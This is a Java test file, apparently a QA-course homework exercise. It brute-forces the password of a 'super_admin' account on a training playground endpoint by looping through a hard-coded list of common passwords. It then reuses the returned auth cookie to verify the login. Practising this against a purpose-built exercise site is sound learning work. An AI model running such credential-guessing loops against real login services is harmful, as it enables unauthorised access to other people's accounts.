import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class CheckPass {

    @Test
    public void checkPass() {
        Map<String, String> data = new HashMap<>();
        String[] passwords = new String[]{"password", "123456",
                "12345678", "abc123", "qwerty", "monkey", "letmein",
                "dragon", "111111", "baseball", "iloveyou", "trustno1",
                "1234567", "sunshine", "master", "123123", "welcome",
                "shadow", "ashley", "football", "jesus", "michael",
                "ninja", "mustang", "password1", "dragon", "sunshine", "bailey",
                "passw0rd", "654321", "superman", "qazwsx", "Football", "solo", "starwars",
                "princess", "000000", "azerty", "princess", "photoshop", "1234567890",
                "admin", "login", "qwertyuiop", "flower", "zaq1zaq1", "loveme", "qazwsx",
                "888888", "7777777", "555555", "qwertyuiop", "654321", "lovely", "1q2w3e4r"};
        data.put("login", "super_admin");
        Map <String, String> responseCookies= new HashMap<>();
         for (int i = 0; i < passwords.length; i++) {
            data.put("password",passwords[i]);
            Response response = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

             System.out.println(response);

            if (response.prettyPrint().contains("\"equals\": true")) {
                responseCookies = response.getCookies();
                System.out.println(responseCookies);
                data.put ("auth_cookie",responseCookies.get("auth_cookie"));
               System.out.println(responseCookies.get("auth_cookie"));
               break;
            }
        }

        Response responsewithpass = RestAssured
                .given()
                .cookies(responseCookies)
                .when()
                .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                .andReturn();
        responsewithpass.prettyPrint();



    }
}
